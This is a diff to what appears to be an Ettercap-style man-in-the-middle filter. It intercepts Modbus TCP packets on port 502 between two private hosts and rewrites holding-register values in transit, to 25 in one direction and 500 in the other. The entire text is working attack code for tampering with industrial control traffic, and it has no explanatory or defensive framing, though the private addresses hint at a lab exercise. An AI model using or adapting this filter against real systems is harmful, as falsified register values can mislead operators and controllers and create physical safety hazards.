@@ -1,13 +1,18 @@
 if (ip.proto == TCP && tcp.dst == 502) {
     if (ip.src == '192.168.1.11' && ip.dst == '192.168.1.13') {
-        if (search(DATA, "\x00\x00\x00\x01")) {
-            replace("\x00\x00\x00\x01", "\x00\x00\x00\x19");
-            msg("Modbus holding register set to 25 for 192.168.1.11 -> 192.168.1.13\n");
+        if (tcp.data) {
+            if (tcp.data[7] == 0x03 && tcp.data[8] == 0x00 && tcp.data[9] == 0x00 && tcp.data[10] == 0x00 && tcp.data[11] == 0x01) {
+                msg("Intercepting Modbus packet from 192.168.1.11 to 192.168.1.13\n");
+                tcp.data[11] = 0x19;  # 25 en hexadécimal
+            }
         }
     } else if (ip.src == '192.168.1.13' && ip.dst == '192.168.1.11') {
-        if (search(DATA, "\x00\x00\x00\x01")) {
-            replace("\x00\x00\x00\x01", "\x00\x01\xF4");
-            msg("Modbus holding register set to 500 for 192.168.1.13 -> 192.168.1.11\n");
+        if (tcp.data) {
+            if (tcp.data[7] == 0x03 && tcp.data[8] == 0x00 && tcp.data[9] == 0x00 && tcp.data[10] == 0x00 && tcp.data[11] == 0x01) {
+                msg("Intercepting Modbus packet from 192.168.1.13 to 192.168.1.11\n");
+                tcp.data[11] = 0xF4;  # 500 en hexadécimal
+                tcp.data[10] = 0x01;
+            }
         }
     }
 }
